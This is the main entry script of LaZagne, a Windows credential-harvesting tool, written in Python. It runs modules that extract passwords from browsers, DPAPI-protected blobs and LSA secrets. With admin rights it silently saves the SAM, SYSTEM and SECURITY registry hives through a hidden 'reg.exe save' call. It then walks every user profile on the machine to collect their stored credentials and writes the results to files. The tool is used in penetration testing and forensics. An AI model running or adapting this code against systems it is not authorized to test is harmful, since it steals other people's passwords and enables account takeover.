# -*- coding: utf-8 -*- 
# !/usr/bin/python

##############################################################################
#                                                                            #
#                           By Alessandro ZANNI                              #
#                                                                            #
##############################################################################

# Disclaimer: Do Not Use this program for illegal purposes ;)

import argparse
import logging
import getpass
import sys
import json
import time
import ctypes
import subprocess
import traceback
import codecs
import os

from lazagne.config.winstructure import get_os_version
from lazagne.config.write_output import parse_json_result_to_buffer, print_debug, StandardOutput
from lazagne.config.change_privileges import list_sids, rev2self, impersonate_sid_long_handle
from lazagne.config.manage_modules import get_categories, get_modules
from lazagne.config.dpapi_structure import *
from lazagne.config.constant import constant

try: 
    import _subprocess as sub
    STARTF_USESHOWWINDOW = sub.STARTF_USESHOWWINDOW  # Not work on Python 3
    SW_HIDE = sub.SW_HIDE
except:
    STARTF_USESHOWWINDOW = subprocess.STARTF_USESHOWWINDOW
    SW_HIDE = subprocess.SW_HIDE

# Useful for the pupy project
# workaround to this error: RuntimeError: maximum recursion depth exceeded while calling a Python object
sys.setrecursionlimit(10000)

# Object used to manage the output / write functions (cf write_output file)
constant.st = StandardOutput()

# Tab containing all passwords
stdoutRes = []
modules = {}

# Define a dictionary for all modules
for category in get_categories():
    modules[category] = {}

# Add all modules to the dictionary
for m in get_modules():
    modules[m.category][m.options['dest']] = m


def output():
    if args['output']:
        if os.path.isdir(args['output']):
            constant.folder_name = args['output']
        else:
            print('[!] Specify a directory, not a file !')

    if args['write_normal']:
        constant.output = 'txt'

    if args['write_json']:
        constant.output = 'json'

    if args['write_all']:
        constant.output = 'all'

    if constant.output:
        if not os.path.exists(constant.folder_name):
            os.makedirs(constant.folder_name)
            # constant.file_name_results = 'credentials' # let the choice of the name to the user

        if constant.output != 'json':
            constant.st.write_header()


def quiet_mode():
    if args['quiet']:
        constant.quiet_mode = True


def verbosity():
    # Write on the console + debug file
    if args['verbose'] == 0:
        level = logging.CRITICAL
    elif args['verbose'] == 1:
        level = logging.INFO
    elif args['verbose'] >= 2:
        level = logging.DEBUG

    formatter = logging.Formatter(fmt='%(message)s')
    stream = logging.StreamHandler(sys.stdout)
    stream.setFormatter(formatter)
    root = logging.getLogger()
    root.setLevel(level)
    # If other logging are set
    for r in root.handlers:
        r.setLevel(logging.CRITICAL)
    root.addHandler(stream)
    del args['verbose']


def manage_advanced_options():
    if 'password' in args:
        constant.user_password = args['password']


def run_module(title, module):
    """
    Run only one module
    """
    try:
        constant.st.title_info(title.capitalize())  # print title
        pwd_found = module.run()  # run the module
        constant.st.print_output(title.capitalize(), pwd_found)  # print the results

        # Return value - not used but needed
        yield True, title.capitalize(), pwd_found
    except Exception:
        error_message = traceback.format_exc()
        print_debug('DEBUG', error_message)
        yield False, title.capitalize(), error_message


def run_modules(module, system_module=False):
    """
    Run modules inside a category (could be one or multiple modules)
    """
    modules_to_launch = []
    try:
        # Launch only a specific module
        for i in args:
            if args[i] and i in module:
                modules_to_launch.append(i)
    except Exception:
        # If no args
        pass

    # Launch all modules
    if not modules_to_launch:
        modules_to_launch = module

    for i in modules_to_launch:
        # Only current user could access to HKCU registry or use some API that only can be run from the user environment
        if not constant.is_current_user:
            if module[i].registry_used or module[i].only_from_current_user:
                continue

        if system_module ^ module[i].system_module:
            continue

        if module[i].winapi_used:
            constant.module_to_exec_at_end['winapi'].append({
                'title': i,
                'module': module[i],
            })
            continue

        if module[i].dpapi_used:
            constant.module_to_exec_at_end['dpapi'].append({
                'title': i,
                'module': module[i],
            })
            continue

        # Run module
        for m in run_module(title=i, module=module[i]):
            yield m


def run_category(category_selected, system_module=False):
    module_to_exec_at_end = constant.module_to_exec_at_end

    categories = [category_selected] if category_selected != 'all' else get_categories()
    for category in categories:
        for r in run_modules(modules[category], system_module):
            yield r

    if not system_module:
        if constant.is_current_user:
            # Modules using Windows API (CryptUnprotectData) can be called from the current session
            for module in constant.module_to_exec_at_end.get('winapi', []):
                for m in run_module(title=module['title'], module=module['module']):
                    yield m

            if constant.module_to_exec_at_end.get('dpapi', []):
                # These modules will need the windows user password to be able to decrypt dpapi blobs
                constant.user_dpapi = UserDpapi(password=constant.user_password)
                # Add username to check username equals passwords
                constant.password_found.append(constant.username)
                constant.user_dpapi.check_credentials(constant.password_found)
                if constant.user_dpapi.unlocked:
                    for module in constant.module_to_exec_at_end.get('dpapi', []):
                        for m in run_module(title=module['title'], module=module['module']):
                            yield m
        else:
            if constant.module_to_exec_at_end.get('dpapi', []) or  constant.module_to_exec_at_end.get('winapi', []): 
                # These modules will need the windows user password to be able to decrypt dpapi blobs
                constant.user_dpapi = UserDpapi(password=constant.user_password)
                # Add username to check username equals passwords
                constant.password_found.append(constant.username)
                constant.user_dpapi.check_credentials(constant.password_found)
                if constant.user_dpapi.unlocked:
                    # Execute winapi and dpapi modules (winapi will decrypt blob using dpapi without calling CryptUnprotectData)
                    for i in ['winapi', 'dpapi']:
                        for module in constant.module_to_exec_at_end.get(i, []):
                            for m in run_module(title=module['title'], module=module['module']):
                                yield m


# Write output to file (json and txt files)
def write_in_file(result):
    if constant.output == 'json' or constant.output == 'all':
        try:
            # Human readable Json format
            pretty_json = json.dumps(result, sort_keys=True, indent=4, separators=(',', ': '))
            with open(os.path.join(constant.folder_name, constant.file_name_results + '.json'), 'a+b') as f:
                f.write(pretty_json.decode('unicode-escape').encode('UTF-8'))

            constant.st.do_print(u'[+] File written: {file}'.format(
                file=os.path.join(constant.folder_name, constant.file_name_results + '.json'))
            )
        except Exception as e:
            print_debug('ERROR', u'Error writing the output file: {error}'.format(error=e))

    if constant.output == 'txt' or constant.output == 'all':
        try:

            with open(os.path.join(constant.folder_name, constant.file_name_results + '.txt'), 'a+b') as f:
                a = parse_json_result_to_buffer(result)
                f.write(a.encode("UTF-8"))

            constant.st.write_footer()
            constant.st.do_print(u'[+] File written: {file}'.format(
                file=os.path.join(constant.folder_name, constant.file_name_results + '.txt'))
            )
        except Exception as e:
            print_debug('ERROR', u'Error writing the output file: {error}'.format(error=e))


# Get user list to retrieve  their passwords
def get_user_list_on_filesystem(impersonated_user=[]):
    # Check users existing on the system (get only directories)
    user_path = u'{drive}:\\Users'.format(drive=constant.drive)
    if float(get_os_version()) < 6:
        user_path = u'{drive}:\\Documents and Settings'.format(drive=constant.drive)

    all_users = []
    if os.path.exists(user_path):
        all_users = [filename for filename in os.listdir(user_path) if os.path.isdir(os.path.join(user_path, filename))]

        # Remove default users
        for user in ['All Users', 'Default User', 'Default', 'Public', 'desktop.ini']:
            if user in all_users:
                all_users.remove(user)

        # Removing user that have already been impersonated
        for imper_user in impersonated_user:
            if imper_user in all_users:
                all_users.remove(imper_user)

    return all_users


def set_env_variables(user, to_impersonate=False):
    # Restore template path
    template_path = {
        'APPDATA': u'{drive}:\\Users\\{user}\\AppData\\Roaming\\',
        'USERPROFILE': u'{drive}:\\Users\\{user}\\',
        'HOMEDRIVE': u'{drive}:',
        'HOMEPATH': u'{drive}:\\Users\\{user}',
        'ALLUSERSPROFILE': u'{drive}:\\ProgramData',
        'COMPOSER_HOME': u'{drive}:\\Users\\{user}\\AppData\\Roaming\\Composer\\',
        'LOCALAPPDATA': u'{drive}:\\Users\\{user}\\AppData\\Local',
    }

    constant.profile = template_path
    if not to_impersonate:
        # Get value from environment variables
        for env in constant.profile:
            if os.environ.get(env):
                constant.profile[env] = os.environ.get(env)
                # constant.profile[env] = os.environ.get(env).decode(sys.getfilesystemencoding())

    # Replace "drive" and "user" with the correct values
    for env in constant.profile:
        constant.profile[env] = constant.profile[env].format(drive=constant.drive, user=user)


# Print user when verbose mode is enabled (without verbose mode the user is printed on the write_output python file)
def print_user(user):
    if logging.getLogger().isEnabledFor(logging.INFO):
        constant.st.print_user(user)


def save_hives():
    for h in constant.hives:
        if not os.path.exists(constant.hives[h]):
            try:
                cmdline = 'reg.exe save hklm\%s %s' % (h, constant.hives[h])
                command = ['cmd.exe', '/c', cmdline]
                info = subprocess.STARTUPINFO()
                info.dwFlags = STARTF_USESHOWWINDOW
                info.wShowWindow = SW_HIDE
                p = subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT,
                                     stdout=subprocess.PIPE, universal_newlines=True)
                results, _ = p.communicate()
            except Exception as e:
                print_debug('ERROR', u'Failed to save system hives: {error}'.format(error=e))
                return False
    return True


def clean_temporary_files():
    # Try to remove all temporary files
    for h in constant.hives:
        if os.path.exists(constant.hives[h]):
            try:
                os.remove(constant.hives[h])
                print_debug('DEBUG', u'Temporary file removed: {filename}'.format(filename=constant.hives[h]))
            except Exception:
                print_debug('DEBUG', u'Temporary file failed to removed: {filename}'.format(filename=constant.hives[h]))


def runLaZagne(category_selected='all', password=None):
    """
    Execution Workflow:
    - If admin: 
        - Execute system modules to retrieve LSA Secrets and user passwords if possible
            - These secret could be useful for further decryption (e.g Wifi)
    - From our user:
        - Retrieve all passwords using their own password storage algorithm (Firefox, Pidgin, etc.)
        - Retrieve all passwords using Windows API - CryptUnprotectData (Chrome, etc.)
        - If the user password or the dpapi hash is found:
            - Retrieve all passowrds from an encrypted blob (Credentials files, Vaults, etc.)
    - From all users found on the filesystem (e.g C:\\Users) - Need admin privilege:
        - Retrieve all passwords using their own password storage algorithm (Firefox, Pidgin, etc.)
        - If the user password or the dpapi hash is found:
            - Retrieve all passowrds from an encrypted blob (Chrome, Credentials files, Vaults, etc.)

    To resume: 
    - Some passwords (e.g Firefox) could be retrieved from any other user
    - CryptUnprotectData can be called only from our current session
    - DPAPI Blob can decrypted only if we have the password or the hash of the user
    """

    # Useful if this function is called from another tool
    if password:
        constant.user_password = password

    # --------- Execute System modules ---------
    if ctypes.windll.shell32.IsUserAnAdmin() != 0:
        if save_hives():
            # System modules (hashdump, lsa secrets, etc.)
            constant.username = 'SYSTEM'
            constant.finalResults = {'User': constant.username}
            constant.system_dpapi = SystemDpapi()

            if logging.getLogger().isEnabledFor(logging.INFO):
                constant.st.print_user(constant.username)
            yield 'User', constant.username

            try:
                for r in run_category(category_selected, system_module=True):
                    yield r

            # Let empty this except - should catch all exceptions to be sure to remove temporary files
            except:
                clean_temporary_files()

            stdoutRes.append(constant.finalResults)
            clean_temporary_files()

    # ------ Part used for user impersonation ------

    # constant.username = getpass.getuser().decode(sys.getfilesystemencoding())
    constant.username = getpass.getuser()
    if not constant.username.endswith('$'):
        constant.is_current_user = True
        constant.finalResults = {'User': constant.username}
        print_user(constant.username)
        yield 'User', constant.username

        set_env_variables(user=constant.username)

        for r in run_category(category_selected):
            yield r
        stdoutRes.append(constant.finalResults)

    constant.is_current_user = False
    # Check if admin to impersonate
    if ctypes.windll.shell32.IsUserAnAdmin() != 0:

    # Broken => TO REMOVE !!!
    #     # --------- Impersonation using tokens ---------

    #     sids = list_sids()
    #     impersonate_users = {}
    #     impersonated_user = [constant.username]

    #     for sid in sids:
    #         # Not save the current user's SIDs and not impersonate system user
    #         if constant.username != sid[3].split('\\', 1)[1] and sid[2] != 'S-1-5-18':
    #             impersonate_users.setdefault(sid[3].split('\\', 1)[1], []).append(sid[2])

    #     for user in impersonate_users:
    #         if 'service' in user.lower().strip():
    #             continue

    #         # Do not impersonate the same user twice
    #         if user in impersonated_user:
    #             continue

    #         print_user(user)
    #         yield 'User', user

    #         constant.finalResults = {'User': user}
    #         for sid in impersonate_users[user]:
    #             try:
    #                 set_env_variables(user, to_impersonate=True)
    #                 impersonate_sid_long_handle(sid, close=False)
    #                 impersonated_user.append(user)

    #                 # Launch module wanted
    #                 for r in run_category(category_selected):
    #                     yield r

    #                 rev2self()
    #                 stdoutRes.append(constant.finalResults)
    #                 break
    #             except Exception:
    #                 print_debug('DEBUG', traceback.format_exc())

        # --------- Impersonation browsing file system ---------

        # Ready to check for all users remaining
        all_users = get_user_list_on_filesystem(impersonated_user=[constant.username])
        for user in all_users:
            # Fix value by default for user environment (APPDATA and USERPROFILE)
            set_env_variables(user, to_impersonate=True)
            print_user(user)

            constant.username = user
            constant.finalResults = {'User': user}
            yield 'User', user

            # Retrieve passwords that need high privileges
            for r in run_category(category_selected):
                yield r

            stdoutRes.append(constant.finalResults)


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description=constant.st.banner, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-version', action='version', version='Version ' + str(constant.CURRENT_VERSION),
                        help='laZagne version')

    # ------------------------------------------- Permanent options -------------------------------------------
    # Version and verbosity
    PPoptional = argparse.ArgumentParser(
        add_help=False,
        formatter_class=lambda prog: argparse.HelpFormatter(prog,
                                                            max_help_position=constant.MAX_HELP_POSITION)
    )
    PPoptional._optionals.title = 'optional arguments'
    PPoptional.add_argument('-v', dest='verbose', action='count', default=0, help='increase verbosity level')
    PPoptional.add_argument('-quiet', dest='quiet', action='store_true', default=False,
                            help='quiet mode: nothing is printed to the output')

    # Output
    PWrite = argparse.ArgumentParser(
        add_help=False,
        formatter_class=lambda prog: argparse.HelpFormatter(prog,
                                                            max_help_position=constant.MAX_HELP_POSITION)
    )
    PWrite._optionals.title = 'Output'
    PWrite.add_argument('-oN', dest='write_normal', action='store_true', default=None,
                        help='output file in a readable format')
    PWrite.add_argument('-oJ', dest='write_json', action='store_true', default=None,
                        help='output file in a json format')
    PWrite.add_argument('-oA', dest='write_all', action='store_true', default=None, help='output file in both format')
    PWrite.add_argument('-output', dest='output', action='store', default='.',
                        help='destination path to store results (default:.)')

    # Windows user password
    PPwd = argparse.ArgumentParser(
        add_help=False,
        formatter_class=lambda prog: argparse.HelpFormatter(
            prog,
            max_help_position=constant.MAX_HELP_POSITION)
    )
    PPwd._optionals.title = 'Windows User Password'
    PPwd.add_argument('-password', dest='password', action='store',
                      help='Windows user password (used to decrypt creds files)')

    # -------------------------- Add options and suboptions to all modules --------------------------
    all_subparser = []
    all_categories = get_categories()
    for c in all_categories:
        all_categories[c]['parser'] = argparse.ArgumentParser(
            add_help=False,
            formatter_class=lambda prog: argparse.HelpFormatter(prog,
                                                                max_help_position=constant.MAX_HELP_POSITION)
        )
        all_categories[c]['parser']._optionals.title = all_categories[c]['help']

        # Manage options
        all_categories[c]['subparser'] = []
        for module in modules[c].keys():
            m = modules[c][module]
            all_categories[c]['parser'].add_argument(m.options['command'], action=m.options['action'],
                                                 dest=m.options['dest'], help=m.options['help'])

            # Manage all suboptions by modules
            if m.suboptions and m.name != 'thunderbird':
                tmp = []
                for sub in m.suboptions:
                    tmp_subparser = argparse.ArgumentParser(
                        add_help=False,
                        formatter_class=lambda prog: argparse.HelpFormatter(
                            prog,
                            max_help_position=constant.MAX_HELP_POSITION)
                    )
                    tmp_subparser._optionals.title = sub['title']
                    if 'type' in sub:
                        tmp_subparser.add_argument(sub['command'], type=sub['type'], action=sub['action'],
                                                   dest=sub['dest'], help=sub['help'])
                    else:
                        tmp_subparser.add_argument(sub['command'], action=sub['action'], dest=sub['dest'],
                                                   help=sub['help'])
                    tmp.append(tmp_subparser)
                    all_subparser.append(tmp_subparser)
                    all_categories[c]['subparser'] += tmp

    # ------------------------------------------- Print all -------------------------------------------

    parents = [PPoptional] + all_subparser + [PPwd, PWrite]
    dic = {'all': {'parents': parents, 'help': 'Run all modules', 'func': run_category}}
    for c in all_categories:
        parser_tab = [PPoptional, all_categories[c]['parser']]
        if 'subparser' in all_categories[c]:
            if all_categories[c]['subparser']:
                parser_tab += all_categories[c]['subparser']
        parser_tab += [PPwd, PWrite]
        dic_tmp = {c: {'parents': parser_tab, 'help': 'Run %s module' % c, 'func': run_category}}
        # Concatenate 2 dic
        dic = dict(dic, **dic_tmp)

    # Main commands
    subparsers = parser.add_subparsers(help='Choose a main command')
    for d in dic:
        subparsers.add_parser(d, parents=dic[d]['parents'], help=dic[d]['help']).set_defaults(func=dic[d]['func'],
                                                                                              auditType=d)

    # ------------------------------------------- Parse arguments -------------------------------------------

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = dict(parser.parse_args()._get_kwargs())
    arguments = parser.parse_args()
    category_selected = args['auditType']

    quiet_mode()

    # Print the title
    constant.st.first_title()

    # Define constant variables
    output()
    verbosity()
    manage_advanced_options()

    start_time = time.time()

    for r in runLaZagne(category_selected):
        pass

    write_in_file(stdoutRes)
    constant.st.print_footer(elapsed_time=str(time.time() - start_time))
